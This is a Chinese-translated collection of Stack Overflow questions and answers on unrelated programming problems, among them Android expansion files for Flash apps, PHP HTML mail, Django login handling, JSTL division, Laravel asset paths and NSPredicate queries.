**- 但**没有明确的答案，我什至不知道这是如何获得 .obb 文件的。

[APK 50meg+ 扩展包和 Flash](https://stackoverflow.com/questions/9781410/apk-50meg-expansion-packs-and-flash)

**-**但我没有亚马逊存储桶账户。也不确定什么是android共享存储。

[创建APK扩展文件的步骤](https://stackoverflow.com/questions/11715855/steps-to-create-apk-expansion-file/11717019#11717019)

**– 但是**使用的是旧版本的谷歌（我没有“添加额外按钮”）而且这不是来自 Flash As3 项目，并且再次依赖于 Eclipse。

[APK 50meg+ 扩展包和 Flash](https://stackoverflow.com/questions/9781410/apk-50meg-expansion-packs-and-flash)

**-但**- 但是这个人已经有了 .obb 文件（如何？）

如您所见，我尝试了许多不同的方式，但我不能简单地创建扩展方式。

简而言之；

```
 Dose anyone one have a clear cut step by step technique on how to upload an .apk
    created in Flash CS6 that is >50MB to Google Play ? 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-02-06T09:53:08.330

您不必准备 obb - 无需使用 jobb。

为air应用程序使用扩展文件的最简单方法是制作一个小型swf作为预加载器并将其用作主apk，而另一个包含所有大数据的swf文件（将被加载）存储在obb文件中。

所以：
preloader.swf -> apk
app.swf -> obb

在这种情况下，您不必制作 obb 文件，只需将新的 apk 上传到 google play 并在扩展文件部分中上传 apk 后将“无扩展文件”更改为“上传新文件”并选择您的 app.swf 文件. 谷歌会把swf改成obb你不需要做的。

当您为新应用上传第一个 apk 时，您将无法添加 obb 文件。您必须只上传 apk，然后添加新版本的 apk - 这会启用 obb 选项。

现在您必须在预加载器类中从 apk 加载 app.swf。我正在使用类似的东西：

```
private var mainVersion:String="1000001";
private var path:String = "Android/obb/com.your.app.id";
private var filename:String= "main." + mainVersion + ".com.your.app.id.obb";//patch for second obb
private var file:File;
private var fileStream:FileStream;
private var bytes:ByteArray;
private var applicationLoader:Loader;

public function App() 
{
    file = File.documentsDirectory.resolvePath(path + "/" + filename);

    if (file.exists)
    {
        loadSwf();
    }
}

private function loadSwf():void 
{
    fileStream = new FileStream(); 
    fileStream.open(file, FileMode.READ);
    bytes = new ByteArray();
    fileStream.readBytes(bytes);
    fileStream.close(); 

    var cont:LoaderContext = new LoaderContext();
    cont.allowCodeImport = true;

    applicationLoader = new Loader();
    applicationLoader.contentLoaderInfo.addEventListener(Event.COMPLETE, handleAppLoaded);
    applicationLoader.contentLoaderInfo.addEventListener(ProgressEvent.PROGRESS, handleProgress);

    applicationLoader.loadBytes(bytes, cont);
}

private function handleProgress(e:ProgressEvent):void 
{
    trace(int(100 * e.bytesLoaded / e.bytesTotal))
    //just add progress bar if you want
}

private function handleAppLoaded(e:Event):void 
{
    addChild(applicationLoader);
} 
```

您可以在预加载器中添加启动画面；）

如果您必须更新 obb 文件，您还必须使用新的 mainVersion 重新编译 apk

如果您想使用 zip 文件而不是 swf，则必须上传一个 zip 文件，并且在预加载器中您必须对其进行处理 - 解压缩并使用解压缩文件夹中的数据。

# android - 用于 android 位置感知应用程序的 Web 服务与服务器程序

> ID：15232579
> 
> 赞同：0
> 
> 时间：2013-03-05T19:35:25.700
> 
> 标签：android

我正在制作一个小型 android 应用程序，可以显示其他用户的位置。我需要制作一个服务器/Web 服务来获取所有用户的位置并向所有用户广播。为此，我应该使用 Web 服务还是制作专用的套接字服务器程序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:02:19.873

要么工作正常。Web 服务的开销更大，因此如果您正在寻找最有效的网络和服务器资源方式，您可以使用服务器套接字。

# php - PHP 不会发送 HTML 邮件

> ID：15232581
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:35:31.780
> 
> 标签：php, email, smtp, send

我有一个利用 PHP Mail() 函数的 HTML 表单。我使用的 SMTP 服务器是 localhost，不需要身份验证。

```
<form action="../../Scripts/fused.php" method="POST"><p>Name</p> <input type="text" name="name">
<p>Email</p> <input type="text" name="email">
<p>Phone</p> <input type="text" name="phone">

<p>Request Phone Call:</p>
Yes:<input type="checkbox" value="Yes" name="call"><br />
No:<input type="checkbox" value="No" name="call"><br />

<p>Website</p> <input type="text" name="website">

<p>Message</p><textarea name="message" rows="6" cols="25"></textarea><br />
<input type="submit" value="Send"><input type="reset" value="Clear">
</form> 
```

这是php文件：

```
<?php

$name = $_POST['name'];
$email = $_POST['email'];
$phone = $_POST['phone'];
$call = $_POST['call'];
$website = $_POST['website'];
$message = $_POST['message'];
$formcontent = 'From: $name \n Phone: $phone \n Call Back: $call \n Website: $website \n Message: $message';
$recipient = 'hr@example.com';
$subject = 'Fused Enterprises Contact Form';

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
$headers .= 'From: <hr@example.com>' . "\r\n";
$headers .= 'Cc: dev@example.com' . "\r\n";

mail($recipient, $subject, $formcontent, $headers) or die("Error!");

echo "Thank You, the form has been submitted. Someone from the Team will contact you shortly." . " -" . "<a href='/Home/' style='text-decoration:none;    color:#1e90ff;'> Return Home</a>";

?> 
```

我必须实施 PEAR Mail 吗？我也尝试过实现这一点，但我没有收到电子邮件。我不知道它是否失败。脚本运行，我得到了`echo`，但我从来没有收到电子邮件。它没有进入垃圾邮件文件夹。

该站点（连同此脚本）托管在 下`example.com`，但电子邮件使用 localhost 和 smtp 服务器`mail.example.com`。它们托管在同一台服务器上。域名的差异可能是个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:57:26.690

要以 HTML 格式发送邮件，Header 是最重要的。使用这个 php 函数.. 我在这里使用这个脚本... [http://ieeeaset.com/mailer/mailer.php](http://ieeeaset.com/mailer/mailer.php)

```
function htmlmail()
    {
        if (strtoupper(substr(PHP_OS,0,3)=='WIN')) { 
            $eol="\r\n"; 
        } elseif (strtoupper(substr(PHP_OS,0,3)=='MAC')) { 
            $eol="\r"; 
        } else { 
            $eol="\n"; 
        }
        $recmail = $_POST['toemail']; // address where you want the mail to be send
        $sub = $_POST['subject']; //subject of email that is sent
        $mess = $_POST['message'];
        $pattern[0]="\'";
        $pattern[1]='\"';
        $replace[0]="'";
        $replace[1]='"';
        $mess=  str_replace($pattern, $replace, $mess);
        $headers = "From: [senders_email].$eol . 
        "MIME-Version: 1.0".$eol .
        "Content-type: text/html; charset=iso-8859-1";
            mail($recmail,$sub,$mess,$headers);
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:55:43.040

一些主机关闭了他们的服务器发送电子邮件的能力（因此不可能从他们的服务器发送垃圾邮件）。我会首先检查一下。

# django - 如何在 django 中实现自定义全局登录/注销功能

> ID：15232588
> 
> 赞同：0
> 
> 时间：2013-03-05T19:36:07.937
> 
> 标签：django, global-variables, django-context, requestcontext

我正在尝试实现自定义登录/注销功能。我的要求与内置的 django 登录功能略有不同。因此，我必须以一种可以在数据库中输入值 0 / 1 来检查用户是否登录的方式来实现此功能。我有一个布尔值。这里的问题实际上是：我应该如何传递一个用户对象/一个变量，它告诉我我的用户已登录（在我的情况下`users.is_logged_in = True`：）到每个 html 模板，以便用户（和我的应用程序）知道它登录。此外，他应该能够通过单击每个 html 页面上的链接来注销。当用户成功登录时，是否有任何全局模板可以创建并制作占位符之类的东西？我的代码是：

```
def checkIfUserIsValid(request, template_name='appCenter.html'):
email = str(request.POST.get('email','')).strip()
password = str(request.POST.get('password','')).strip()
try:
    users = Users.objects.get(email = email, password = password)
    users.is_logged_in = True
    users.save()
    return direct_to_template(request, template_name, context_instance=RequestContext(request))
except Users.DoesNotExist:
    incorrectUserOrPassError = "Incorrect Username or Password. Please try again."
    return render_to_response('index.html', {'incorrectUserOrPassError':incorrectUserOrPassError},
                                  context_instance=RequestContext(request))

def logOutUser(request, template_name='index.html'):
    return direct_to_template(request, template_name, context_instance=RequestContext(request)) 
```

PS：我已经研究了 render() 方法..

```
return render(request,'appCenter.html',{'users':users}) 
```

我可以做这样的事情并将模板用作全局模板或其他东西吗？但我看到的问题是，一旦用户通过身份验证，我就必须将他重定向到 appCenter.html。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:49:05.367

**不要这样做**。

您将纯文本密码存储在数据库中。这是不安全的。真的，不要这样做。

您没有展示任何使用 Django 的内置身份验证系统无法更好地完成的事情，该系统已经将`user`对象包含在每个模板中（通过上下文处理器）。用那个。

# c# - 更改缓存中的间隔以更新 GPS - Windows Phone 7.5

> ID：15232590
> 
> 赞同：1
> 
> 时间：2013-03-05T19:36:11.050
> 
> 标签：c#, windows-phone-7

我正在尝试在 BackgroundWorker 中获取 GPS 位置。我读到，数据是从缓存中获取的，这些缓存每 15 分钟更新一次。是否可以重新安排缓存的更新间隔？现在我正在使用模拟器，并且我总是在事件 StatusChanged 中获得 NoData。

好的，你能解释一下，它是如何在模拟器中工作的吗？这是我的代码：

```
private GeoCoordinateWatcher watcher = new GeoCoordinateWatcher(GeoPositionAccuracy.High);

    private void StartGeoWatcher()
    {
        watcher.StatusChanged += GeoWatcherStatusChanged;
        watcher.PositionChanged += GeoWatcherPositionChanged;
        watcher.Start();
    }

    void GeoWatcherPositionChanged(object sender, GeoPositionChangedEventArgs<GeoCoordinate> e)
    {

    }

    void GeoWatcherStatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
    {
        switch (e.Status)
        {
                case GeoPositionStatus.Initializing:
                    break;
                case GeoPositionStatus.Ready:
                    break;
                case GeoPositionStatus.NoData:
                    break;
                case GeoPositionStatus.Disabled:
                    break;
        }

    } 
```

我在我的应用程序中启动模拟器。之后，我在附加工具中选择了一些位置。选择位置后，单击应用程序中的按钮，周期性任务将运行。首先： StatusChanged 被调用，状态为“正在初始化”。第二：以状态“NoData”调用 StatusChanged。我不知道为什么，因为我在其他工具中选择了位置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:39:53.453

这不是真的，您可以通过为[GeoCoordinateWatcher.DesiredAccuracy](http://msdn.microsoft.com/en-us/library/system.device.location.geocoordinatewatcher.desiredaccuracy.aspx)属性指定 GeoPositionAccuracy.High 来获取实时 GPS 位置。但这会耗尽你的电池。

即使在正常设置下，您也应该能够获得几乎实时的位置。

# java - JSTL 除法自动四舍五入为 1 或 0

> ID：15232594
> 
> 赞同：2
> 
> 时间：2013-03-05T19:36:31.860
> 
> 标签：java, spring-mvc, jstl, division

我发现了很多关于如何在 JSTL 中对数字进行四舍五入的问题。我的问题是相反的。不知何故，当我计算胜利/总数以获得胜利的百分比时，我总是得到 0 或 1。模式是一致的：如果胜利 >= 失败，结果为 1，否则为零。所以似乎有一个 Math.round 在这里某处进行。但我不知道它来自哪里。

我一直在尝试重现此错误，但每当我尝试重现它时，我实际上得到了我期望的值（0 到 1**之间的值）。**这让我认为问题在于我正在执行 SQL 查询，并将列表结果添加到模型中（我使用的是 Spring MVC），尽管我不确定为什么会出现问题。

Spring MVC 控制器代码：

```
@RequestMapping(value = "/player/{player}", method = RequestMethod.GET)
public String player(@PathVariable String player, Model model) {
    String query = "SELECT v2.player, SUM(IF(v1.result >= 26, 1, 0)) `playerWins`, " +
            "SUM(IF(v2.result >= 26, 1, 0)) `oppWins` FROM mines_playing AS v1 " +
            "JOIN mines_playing AS v2 ON (v1.gameid = v2.gameid) AND (v1.playerpos != v2.playerpos) " +
            "JOIN mines AS v3 ON (v1.gameid = v3.gameid) AND v3.finished = 1 " +
            "WHERE v1.player = ? AND v3.finished = 1 " +
            "GROUP BY v2.player " +
            "ORDER BY playerWins DESC";

    Session sess = sessionFactory.openSession();
    SQLQuery q = sess.createSQLQuery(query);
    q.setString(0, player);
    q.setResultTransformer(Transformers.ALIAS_TO_ENTITY_MAP);

    List<?> list = q.list();
    model.addAttribute("size", list.size());
    model.addAttribute("winList", list);
    model.addAttribute("player", player);

    sess.disconnect();
    return "player/playerstats";
} 
```

JSTL 代码：

```
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ page session="false" %>
(...)

<c:forEach items="${winList}" var="element">
    <c:set var="lost" value="${element['oppWins']}" />
    <c:set var="wins" value="${element['playerWins']}" />

    <c:set var="total" value="${wins + lost}" />
    <c:if test="${total > 0}">
    <tr>
        <td><a href="<c:url value="vs/${element['player']}" />"><c:out value="${element['player']}">Null</c:out></a></td>
        <td>${total}</td>
        <td>${wins}</td>
        <td>${lost}</td>
        <td>${wins / total}</td>
    </tr>
    </c:if>
</c:forEach> 
```

我究竟做错了什么？为什么wins / total的值会自动四舍五入？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T20:23:55.050

您是否使用“可分割”数据类型？

尝试将其解析为数字。像这样：

```
<c:set var="wins" ><fmt:parseNumber type="number" value="${element['playerWins']}" /></c:set>
<c:set var="lost" ><fmt:parseNumber type="number" value="${element['oppWins']}" /></c:set> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:49:41.523

您无法从代码中看出，但我想这是因为 wins 和 total 是整数。整数除法得到一个整数。

# ember.js - 在检查我自己的 ember 应用程序时，Ember Inspector 给了我错误

> ID：15232596
> 
> 赞同：4
> 
> 时间：2013-03-05T19:36:35.610
> 
> 标签：ember.js

我在 chrome 开发人员工具中使用 ember 检查器。并尝试调试。如果当我将鼠标悬停在应用程序或检查器中的任何其他项目上时访问[Discourse 的站点，它会突出显示页面上的项目。](http://try.discourse.org)但是在我正在测试的我自己的网站上，我得到了两个错误。

```
Uncaught TypeError: Object [object Object] has no method 'highlightView'
Uncaught TypeError: Cannot read property 'style' of undefined 
```

它试图设置一些在我的网站上不存在但在话语网站上存在的 DOM 元素。有什么想法我需要设置才能使其正常工作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-13T19:39:24.767

**ember-extension** - 尤其是 master - 需要**ember**和**ember-data**的最新 master ，因为引入的一些功能可能尚未发布。

我建议更新您的依赖项并尝试[最新的夜间版本](http://ember-extension.s3-website-us-east-1.amazonaws.com/ember-extension-latest.zip "Ember 扩展最新")

# html - 在表单上隐藏 DIV 时有很大的空白

> ID：15232597
> 
> 赞同：0
> 
> 时间：2013-03-05T19:36:40.113
> 
> 标签：html, css

我正在尝试使用以下方法隐藏表单中的 DIV： `document.getElementById('cost_pass').style.visibility = 'hidden';`

但是当我这样做时，表单会在 DIV 曾经所在的位置保留一个空白区域，有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-05T19:37:55.750

这不是错误，可见性以这种方式工作（隐藏元素，但为其保留空间）。试试看嘛

```
document.getElementById('cost_pass').style.display = 'none'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:40:23.030

将可见性设置为隐藏只会从页面中隐藏 DIV，但它所占据的空间仍然存在（可见性不影响页面流）。您应该考虑使用 Display 属性来隐藏/显示您的 div。

[https://developer.mozilla.org/en-US/docs/CSS/display](https://developer.mozilla.org/en-US/docs/CSS/display)

# linux - 如何将用于列出重复文件的区分大小写的脚本转换为不区分大小写？

> ID：15232598
> 
> 赞同：0
> 
> 时间：2013-03-05T19:36:45.733
> 
> 标签：linux, unix, terminal

该脚本将列出所有具有相同文件名的文件，即使它们位于不同的（子）目录或具有不同的文件扩展名（或根本没有扩展名）：

```
declare -A array=() dupes=()
while IFS= read -r -d '' file; do 
    base=${file##*/} base=${base%.*}
    if [[ ${array[$base]} ]]; then 
        dupes[$base]+=" $file"
    else
        array[$base]=$file
    fi
done < <(find /the/dir -type f -print0)

for key in "${!dupes[@]}"; do 
    echo "$key: ${array[$key]}${dupes[$key]}"
done 
```

（[来源](https://askubuntu.com/questions/48524/search-for-duplicate-file-names-within-folder-hierarchy/48549#48549)）

我想做完全相同的事情，但也想在不同的情况下列出具有相同文件名的文件。这意味着所有这些文件将被列为重复文件：

```
/the/dir/file.txt
/the/dir/folder1/File
/the/dir/folder2/filE.JPG 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:42:48.830

你的 shell 脚本中需要这一行：

```
base=`echo $base | tr '[A-Z]' '[a-z]'` 
```

这会将您的所有文件名转换为小写。瞧 - 不区分大小写的哈希键。

# php - Laravel 样式表和 javascript 不会为非基础路由加载

> ID：15232600
> 
> 赞同：104
> 
> 时间：2013-03-05T19:36:47.177
> 
> 标签：php, laravel, blade

好的——我知道这是一个非常基本的问题，但我无法弄清楚。*这是一个关于 Laravel 的问题。*

基本上，我将样式表嵌入到我的默认布局视图中。我目前只是使用常规 css 来链接它们，例如：

```
<link rel="stylesheet" href="css/app.css" /> 
```

当我在单层路线（例如**/about** ）时它工作得很好，但当我更深入时停止工作，例如**/about/me**。

如果我查看 Chrome 的开发者控制台，我会看到以下一些错误（仅针对更深层次的路线）：

```
Resource interpreted as Stylesheet but transferred with MIME type text/html: "http://example.dev/about/css/app.css". 
```

很明显，它现在正在寻找“about”文件夹中的 css——当然这根本不是一个文件夹。

无论路线如何，我只想让它在同一个地方寻找资产。

* * *

## 回答 #1

> 赞同：174
> 
> 时间：2013-05-15T12:58:11.933

对于 Laravel 4 和 5：

```
<link rel="stylesheet" href="{{ URL::asset('assets/css/bootstrap.min.css') }}"> 
```

**[`URL::asset`](https://laravel.com/api/5.7/Illuminate/Contracts/Routing/UrlGenerator.html#method_asset)**将链接到您的**`project/public/`**文件夹，因此请将您的脚本放在那里。

* * *

^(**注意：**为此，您需要使用“[刀片模板引擎](https://laravel.com/docs/master/blade)”。Blade 文件使用*`.blade.php`*扩展名。)

* * *

## 回答 #2

> 赞同：53
> 
> 时间：2013-09-29T13:50:03.717

**拉拉维尔 4**

更好和正确的方法来做到这一点

**添加 CSS**

HTML::style 将链接到您的 project/public/ 文件夹

```
{{ HTML::style('css/bootstrap.css') }} 
```

**添加JS**

HTML::script 将链接到您的 project/public/ 文件夹

```
{{ HTML::script('js/script.js') }} 
```

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2013-03-05T20:50:27.907

您正在为您的资产使用相对路径，更改为绝对路径，一切都会正常工作（在“css”之前添加一个斜杠。

```
<link rel="stylesheet" href="/css/app.css" /> 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2015-05-03T07:42:08.010

**在 Laravel 5**中，
有两种方法可以在视图中加载 js 文件，
第一种是使用 html 助手，第二种是使用资产助手。
要使用 html 助手，您必须首先通过命令行安装此包：

```
composer require illuminate/html 
```

那么你需要reqister它，所以去config/app.php，并将这一行添加到providers数组中

```
'Illuminate\Html\HtmlServiceProvider' 
```

然后你必须为你的 html 包定义别名，所以去 config/app.php 中的别名数组并添加这个

```
'Html'     => 'Illuminate\Html\HtmlFacade' 
```

现在您的 html 助手已安装，因此您可以在刀片视图文件中编写以下代码：

```
{!! Html::script('js/test.js') !!} 
```

这将在您的 project_root/public/js/test.js 中查找您的 test.js 文件。
///////////////////////////////////////// ///////////
要使用资产助手而不是html助手，你必须在你的视图文件中这样写：

```
<script src="{{ URL::asset('test.js') }}"></script> 
```

这将在 project_root/resources/assets/test.js 中查找 test.js 文件

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2013-03-05T20:47:05.373

如果你在公共文件夹中使用 Laravel 3 和你的 CSS/JS 文件，像这样

```
public/css
public/js 
```

然后你可以像这样在 Blade 模板中调用它们

```
{{ HTML::style('css/style.css'); }}
{{ HTML::script('js/jquery-1.8.2.min.js'); }} 
```

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2013-05-22T04:16:53.160

我建议你在 {project}/application/routes.php 之前把它放在路由过滤器上

```
Route::filter('before', function()
{
    // Do stuff before every request to your application...    
    Asset::add('jquery', 'js/jquery-2.0.0.min.js');
    Asset::add('style', 'template/style.css');
    Asset::add('style2', 'css/style.css');

}); 
```

并使用刀片模板引擎

```
{{ Asset::styles() }}
{{ Asset::scripts(); }} 
```

或更多关于[laravel 管理资产文档](http://laravel.com/docs/views/assets)

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2014-03-12T07:46:39.073

你`laravel 4`只需要这样粘贴`{{ URL::asset('/') }}`：

```
 <link rel="stylesheet" href="{{ URL::asset('/') }}css/app.css" />. 
```

对于以下情况也是如此：

```
 <script language="JavaScript" src="{{ URL::asset('/') }}js/jquery.js"></script>
  <img src="{{ URL::asset('/') }}img/image.gif"> 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2017-04-01T00:08:43.683

带有混合助手的 Laravel 5.4：

```
<link href="{{ mix('/css/app.css') }}" rel="stylesheet">
<script src="{{ mix('/js/app.js') }}"> </script> 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2018-11-14T12:01:04.460

在 Laravel 5.7 中，将您的 CSS 或 JS 文件放入 Public 目录。

对于 CSS：

```
<link rel="stylesheet" href="{{ asset('bootstrap.min.css') }}"> 
```

对于 JS：

```
<script type="text/javascript" src="{{ asset('bootstrap.js') }}"></script> 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2014-11-01T23:34:01.957

我认为最好的方法是在你的 HTML 中添加 BASE 标签

```
<base href="/" target="_top"> 
```

所以没有必要使用类似的东西

```
{{ HTML::script('js/jquery/jquery-1.11.1.min.js'); }} 
```

只需键入

```
<script src="js/jquery/jquery-1.11.1.min.js"></script> 
```

在您看来，它会起作用。

此方法将处理 RESTful URL 和静态资源作为图像、css、脚本。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2016-01-06T10:44:36.987

Vinsa 几乎是对的，您应该添加

```
<base href="{{URL::asset('/')}}" target="_top"> 
```

并且脚本应该进入它们的常规路径

```
<script src="js/jquery/jquery-1.11.1.min.js"></script> 
```

这是因为如果没有附加基本路径，图像和其他具有相对路径的东西（如图像源或 ajax 请求）将无法正常工作。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2013-03-06T06:15:58.427

如果您对其进行硬编码，您可能应该使用完整路径 ( `href="http://example.com/public/css/app.css"`)。但是，这意味着您必须手动调整用于开发和生产的 URL。

上述解决方案的替代方案是`<link rel="stylesheet" href="URL::to_asset('css/app.css')" />`在 Laravel 3 或`<link rel="stylesheet" href="URL::asset('css/app.css')" />`Laravel 4 中使用。这将允许您以您想要的方式编写 HTML，但也让 Laravel 在任何环境中为您生成正确的路径。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2017-10-20T01:56:44.790

**只需添加另一个问题：**

如果你想`/public`从你的项目中删除`.htaccess`，

那么你可以使用这个，[Add `public`before `/css`inside `asset()`]

```
<link href="{{ asset('public/css/app.css') }}" rel="stylesheet"> 
```

[有时，它很有用。]

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2017-05-09T11:24:18.380

更好的使用方式，

```
<link rel="stylesheet" href="{{asset('assets/libraries/css/app.css')}}"> 
```

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2017-05-30T03:45:24.230

假设您没有重命名您的公用文件夹。您的 css 和 js 文件位于公共文件夹的 css 和 js 子文件夹中。现在你的标题将是：

```
<link rel="stylesheet" type="text/css" href="/public/css/icon.css"/>
<script type="text/javascript" src="/public/js/jquery.easyui.min.js"></script> 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2019-07-28T08:33:01.600

将您的脚本文件放在公共目录中，然后使用（例如 userFunctions.js）

```
<script type="text/javascript" src="{{asset('js/userFunctions.js')}}"> 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2018-08-20T10:35:21.677

对于 Laravel 4：{！！对于双花括号 { {
和 Laravel 5 及以上版本：您可以替换 {!! 由 {{ and !!} by }} 在高端版本中

如果您已将 JavaScript 放置在自定义目录中。
例如，如果您**`jQuery-2.2.0.min.js`**被放置在目录下，**`resources/views/admin/plugins/js/`**那么**`*.blade.php`**您将能够在该部分的末尾添加为

```
<script src="{!! asset('resources/views/admin/plugins/js/jQuery-2.2.0.min.js') !!}"></script> 
```

由于高端版本也支持低端版本，但反之亦然

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2019-07-13T20:08:00.860

在 Laravel 5.8 中

```
<script src="{{asset('js/customPath1/customPath2/customjavascript.js')}}"></script> 
```

只是为我做了伎俩。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2019-03-29T10:22:01.750

更好和正确的方法：

```
<link rel="stylesheet" href="{{ asset('assets/css/bootstrap.min.css') }}"> 
```

# emacs - 如何在 Emacs Org-Mode 中锁定表字段（使它们只读，常量）？

> ID：15232602
> 
> 赞同：3
> 
> 时间：2013-03-05T19:36:55.890
> 
> 标签：emacs, spreadsheet, org-mode, readonly

我正在为战争游戏制作电子表格。某些字段具有定义单个模型的点值的常量值，我想让这些字段只读/常量（以免意外修改它们）。这是一个组织模式中的演示列表，有两个骷髅单位（16 和 24 个模型）和两个骨龙（1 和 2 个模型），两者都有升级（总结的附加值）：

```
#+CONSTANTS: SKELETON=6 SKELETON_BOW=2 SKELETON_SWORD=1
#+CONSTANTS: BONE_DRAGON=60 BONE_DRAGON_POISON=20
|---+-------------+------+------+-----+----+-----|
|   | _UNIT_      | P[1] | N[2] |   + |  N |   + |
|---+-------------+------+------+-----+----+-----|
| # | SKELETON    |    6 |   16 |  96 | 24 | 144 |
| # | Bow         |    2 |    0 |   0 | 12 |  24 |
| # | Sword       |    1 |   16 |  16 | 12 |  12 |
| # | *SUMS*      |      |      | 112 |    | 180 |
| # | *TOTAL*     |  292 |      |     |    |     |
|---+-------------+------+------+-----+----+-----|
| # | BONE_DRAGON |   80 |    1 |  80 |  2 | 160 |
| # | Poison      |   20 |    1 |  20 |  0 |   0 |
| # | *SUMS*      |      |      | 100 |    | 160 |
| # | *TOTAL*     |  260 |      |     |    |     |
|---+-------------+------+------+-----+----+-----|
| # | *TOTAL*     |  552 |      |     |    |     |
|---+-------------+------+------+-----+----+-----|
#+TBLFM: @2$3=$SKELETON::@2$5=(@2$3*@2$4)::@2$7=(@2$3*@2$6)::@3$3=$SKELETON_BOW::@3$5=(@3$3*@3$4)::@3$7=(@3$3*@3$6)::@4$3=$SKELETON_SWORD::@4$5=(@4$3*@4$4)::@4$7=(@4$3*@4$6)::@5$5=vsum(@2$5..@4$5)::@5$7=vsum(@2$7..@4$7)::@6$3=(@5$5+@5$7)::@7$3=$BONE_DRAGON::@7$5=(@7$3*@7$4)::@7$7=(@7$3*@7$6)::@8$3=$BONE_DRAGON_POISON::@8$5=(@8$3*@8$4)::@8$7=(@8$3*@8$6)::@9$5=vsum(@7$5..@8$5)::@9$7=vsum(@7$7..@8$7)::@10$3=(@9$5+@9$7)::@11$3=(@6$3+@10$3)

[1] Points per model
[2] Number of models 
```

如您所见，我已经找到了一个带有常量的解决方案（Carsten Dominik 的 constant.el 包 [http://staff.science.uva.nl/~dominik/Tools/](http://staff.science.uva.nl/~dominik/Tools/)）。

已取得的成就：

*   恢复 PPM 的意外修改
*   常量只定义一次

**是否有标准的组织模式方式使字段真正只读？**我在组织模式手册中没有找到答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-03T17:02:18.667

不确定 org-mode 方式，但[“Emacs：使部分缓冲区只读”](https://unix.stackexchange.com/questions/76531/emacs-make-portion-of-buffer-readonly)可能会有所帮助。它的作用是使用 put-text-property 在缓冲区中设置只读属性。

# unit-testing - RhinoMock 更新方法参数的属性

> ID：15232607
> 
> 赞同：1
> 
> 时间：2013-03-05T19:37:05.833
> 
> 标签：unit-testing, mocking, rhino-mocks, stub

我的代码中有以下两行：

```
Factory.MyMethod(argument);
var property = argument.InterestingValue; 
```

所以，`MyMethod`接受一个类的实例并更新`InterestingValue`这个实例。它不返回任何东西（无效）。

然后在我的代码中使用它`InterestingValue`。

对于单元测试，我想创建我的工厂的存根并对其进行编程，以便在`MyMethod`调用时更新实际的对象（参数）。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:58:56.160

```
fakeFactory.Stub(ff=> ff.MyMethod(null)).IgnoreArguments()
            .WhenCalled(ff => 
            {
                var arg = (ArgumentClass)ssf.Arguments[0];
                arg.InterestingValue = new Whatever
                    {
                    };

                ff.ReturnValue = arg;
            }); 
```

# ios - 包含集合的集合的 NSPredicate 查询 (KVC)

> ID：15232614
> 
> 赞同：1
> 
> 时间：2013-03-05T19:37:37.030
> 
> 标签：ios, collections, nspredicate, kvc

编辑（我错过了一层细节）：每个老师都有一系列的课程。（我也通过验证器运行了 JSON，所以它更容易阅读）假设以下 JSON：

```
{
"schools": [
    {
        "schoolID": "01",
        "schoolName": "School01",
        "teachers": [
            {
                "name": "Mr. Russell",
                "teacherID": "teach01",
                "classes": [
                    {
                        "className": "History",
                        "classID": "class01"
                    },
                    {
                        "className": "Civics",
                        "classID": "class02"
                    }
                ]
            },
            {
                "name": "Mrs. Pearl",
                "teacherID": "teach02",
                "classes": [
                    {
                        "className": "English",
                        "classID": "class05"
                    },
                    {
                        "className": "Poetry",
                        "classID": "class06"
                    }
                ]
            }
        ]
    },
    {
        "schoolID": "02",
        "schoolName": "School01",
        "teachers": [
            {
                "name": "Mr. Russell",
                "teacherID": "teach05",
                "classes": [
                    {
                        "className": "Pre-Calc",
                        "classID": "class10"
                    },
                    {
                        "className": "Calculus",
                        "classID": "class12"
                    }
                ]
            },
            {
                "name": "Mr. Marks",
                "teacherID": "teach07",
                "classes": [
                    {
                        "className": "History",
                        "classID": "class01"
                    },
                    {
                        "className": "Driving",
                        "classID": "class20"
                    }
                ]
            }
        ]
    }
]
} 
```

即，我有一个学校数组，每个学校都包含一个教师数组，每个教师包含一个班级数组。（抱歉，如果 JSON 的确切格式不太正确；这是一个理论模型，因为由于 NDA 的要求，我无法透露真实的模型。实际模型是合理的。）

我需要使用 NSPredicate 和 KVC 对这个集合进行搜索，并获取所有名为“History”的类名。我尝试了几种不同的方式来执行它，但结果是空的。例如：

```
NSPredicate *pred = [NSPredicate predicateWithFormat:@"ANY schools.teachers.classes.className == %@", @"History"]; 
```

